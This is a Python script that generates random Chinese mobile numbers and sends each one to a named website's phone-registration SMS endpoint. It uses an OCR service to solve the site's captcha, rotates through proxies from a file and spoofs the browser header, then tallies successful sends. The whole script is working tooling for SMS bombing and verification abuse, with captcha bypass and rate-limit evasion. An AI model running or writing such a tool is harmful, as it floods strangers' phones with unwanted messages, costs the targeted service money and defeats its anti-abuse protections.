import requests
from scapy.all import *


def get_phone_num():
    second_spot = random.choice([3, 4, 5, 7, 8])
    third_spot = {3: random.randint(0, 9),
                  4: random.choice([5, 7, 9]),
                  5: random.choice([i for i in range(10) if i != 4]),
                  7: random.choice([i for i in range(10) if i not in [4, 9]]),
                  8: random.randint(0, 9), }[second_spot]
    remain_spot = random.randint(9999999, 100000000)
    phone_num = "1{}{}{}".format(second_spot, third_spot, remain_spot)
    return phone_num


if __name__ == '__main__':
    # scheme = input("请输入协议头：")
    # domain = input("请输入域名：")
    # captch = input("是否启用验证码（y/n）：")
    # proxy_file = input("代理ip文件（ip:prot）：")
    scheme = "https"
    domain = "ovvps.com"
    captch = "y"
    proxy_file = 'd:/a.txt'
    url = scheme + "://" + domain
    f = open(proxy_file)
    proxy = f.readline().replace('\r', '').replace('\n', '')
    x, y, z = 0, 0, 0
    while proxy:
        z += 1
        # resp = requests.get("http://demo.spiderpy.cn/get/").json()
        # proxy = resp['proxy']
        print(proxy)
        phone = get_phone_num()
        if captch == 'y':
            i=0
            while i <= 2:
                try:
                    req = requests.get(url + "/verify?name=allow_register_phone_captcha")
                    cookies = ''
                    for item in req.cookies.keys():
                        if req.cookies.get(name=item, domain=url) is None:
                            continue
                        cookies += item + '=' + req.cookies.get(name=item, domain=url) + ';'
                    headers = {
                        "Cookie": cookies
                    }
                    file = io.BytesIO(req.content)
                    orc = requests.post("http://127.0.0.1:9898/ocr/file", files={'image': file})
                    send = requests.post(url + '/register_phone_send', cookies=req.cookies,
                                         data='phone=' + phone + '&phone_code=%2B86&captcha=' + orc.text,
                                         headers={
                                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                           "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                         },
                                         proxies={
                                             'http': 'http://' + proxy,
                                             'https': 'https://' + proxy
                                         })
                    print(send.text)
                    if '图形' in send.json()['msg']:
                        continue
                    if send.json()['status'] == 200:
                        x += 1
                        break
                    if i == 2:
                        y += 1
                except Exception as e:
                    print(e)
                    if i == 2:
                        y += 1
                i+=1
        else:
            for i in range(3):
                try:
                    send = requests.post(url + '/register_phone_send',
                                         headers={
                                             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, "
                                                           "like Gecko) Chrome/50.0.2661.87 Safari/537.36 "
                                         },
                                         data='phone=' + phone + '&phone_code=%2B86',
                                         proxies={
                                             'http': 'http://' + proxy,
                                             'https': 'https://' + proxy
                                         }, timeout=30)
                    print(send.text)
                    if send.json()['status'] == 200:
                        x += 1
                        break
                    if i == 2:
                        y += 1
                except Exception as e:
                    print(e)
                    if i == 2:
                        y += 1
        proxy = f.readline()
    f.close()
    print("结束，共执行{}次，成功{}，失败{}".format(z, x, y))
